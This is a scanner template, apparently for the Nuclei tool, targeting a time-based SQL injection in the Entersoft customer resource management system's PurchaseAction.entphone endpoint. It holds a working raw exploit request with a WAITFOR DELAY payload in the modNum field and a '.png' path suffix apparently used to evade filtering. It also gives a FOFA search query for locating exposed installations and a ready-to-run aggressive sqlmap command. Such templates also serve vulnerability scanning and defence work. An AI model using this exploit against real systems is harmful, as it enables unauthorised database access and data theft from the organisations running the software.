id: entersoft-PurchaseAction-entphone-sqli

info:
  name: 浙大恩特客户资源管理系统 purchaseaction-entphone - sqli
  author: leadlife
  severity: high
  description: 
  reference:
    - todo
  metadata:
    verified: true
    max-request: 1
    fofa-query: title=“欢迎使用浙大恩特客户资源管理系统”
    tips: modNum is injection
    sqlmap: sqlmap -r sqli.txt --level 5 --tamper=space2comment --risk 3 --batch --random-agent --dbms=mssql
  tags: entersoft,sqli,time

http:
  - raw:
      - |
        @timeout: 15s
        POST /entsoft/PurchaseAction.entphone;.png?method=AuthorityJudgement HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: application/x-www-form-urlencoded

        modNum=1';WAITFOR DELAY '0:0:6'--+

    matchers:
      - type: dsl
        dsl:
          - contains(header,'entsoft')
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and